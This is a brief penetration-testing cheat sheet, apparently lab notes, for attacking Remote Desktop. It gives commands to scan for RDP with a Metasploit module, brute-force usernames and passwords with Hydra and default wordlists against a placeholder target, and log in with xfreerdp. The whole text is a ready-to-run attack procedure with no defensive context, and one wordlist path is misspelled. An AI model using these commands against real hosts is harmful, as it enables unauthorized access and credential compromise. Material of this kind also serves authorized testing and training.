# VIA METASPLOIT 

search RDP_scanner
choose module: auxiliary/scanner/rdp/rdp_scanner -> Set RHOST and RPORT

## Obtain credentials for RDP 

Hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwrods.txt rdp://TARGET -s RPORT

## Authentication 

Xfreerdp /u:USER /p:PASSWORD /v:TARGET:RPORT
